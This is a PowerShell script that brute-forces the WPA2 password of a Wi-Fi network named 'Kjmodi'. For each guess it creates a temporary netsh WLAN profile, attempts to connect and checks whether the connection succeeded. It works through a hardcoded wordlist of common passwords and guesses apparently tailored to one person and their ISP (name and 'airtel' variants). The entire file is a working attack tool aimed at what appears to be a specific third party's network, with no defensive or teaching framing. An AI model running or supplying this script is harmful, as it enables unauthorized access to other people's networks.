param(
    [string]$ssid = "Kjmodi",
    [string]$passwordFile = "",
    [string]$password = ""
)

function Try-Password {
    param([string]$ssid, [string]$pw)
    
    $xml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$ssid</name>
    <SSIDConfig>
        <SSID>
            <name>$ssid</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$pw</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"@
    
    $tempFile = "$env:TEMP\wifi_profile_$(Get-Random).xml"
    $xml | Out-File -FilePath $tempFile -Encoding utf8
    
    # Add profile
    $addResult = netsh wlan add profile filename="$tempFile"
    
    # Try to connect
    $connectResult = netsh wlan connect name="$ssid" 2>&1
    
    Start-Sleep -Seconds 3
    
    # Check if connected
    $status = netsh wlan show interfaces | Select-String "$ssid"
    
    # Remove profile
    netsh wlan delete profile name="$ssid" 2>&1 | Out-Null
    
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    
    if ($status) {
        return $true
    }
    return $false
}

if ($password) {
    $result = Try-Password -ssid $ssid -pw $password
    if ($result) {
        Write-Host "SUCCESS! Password: $password" -ForegroundColor Green
        return
    } else {
        Write-Host "FAILED: $password" -ForegroundColor Red
    }
    return
}

# Common passwords to try
$passwords = @(
    "12345678",
    "password",
    "1234567890",
    "9876543210",
    "airtel@123",
    "airtel123",
    "admin123",
    "wifi123",
    "kjmodi123",
    "kjmodi@123",
    "krishna123",
    "modi123",
    "kunj123",
    "kunj@123",
    "kunjmodi",
    "Kjmodi123",
    "Kjmodi@123",
    "123456789",
    "india123",
    "password123",
    "00000000",
    "11111111",
    "airtel2023",
    "airtel@2023",
    "987654321",
    "12345678910",
    "welcome",
    "guest123"
)

foreach ($pw in $passwords) {
    Write-Host "Trying: $pw" -NoNewline
    $result = Try-Password -ssid $ssid -pw $pw
    if ($result) {
        Write-Host "`n✅ PASSWORD FOUND: $pw" -ForegroundColor Green
        return
    }
    Write-Host " ✗"
}
